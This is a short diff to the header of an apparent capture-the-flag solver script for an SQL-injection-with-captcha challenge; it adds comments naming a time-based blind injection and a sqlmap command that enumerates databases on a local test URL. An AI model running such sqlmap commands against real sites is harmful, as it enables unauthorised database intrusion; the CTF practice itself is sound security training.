@@ -1,5 +1,7 @@
 # Kenzy challenge from ASCWG CTF
 # Sqli with captcha
+# Type: time-based blind
+# Command: python sqlmap.py -u http://127.0.0.1:5000/query-example?language=* --dbs
 
 import requests
 import json
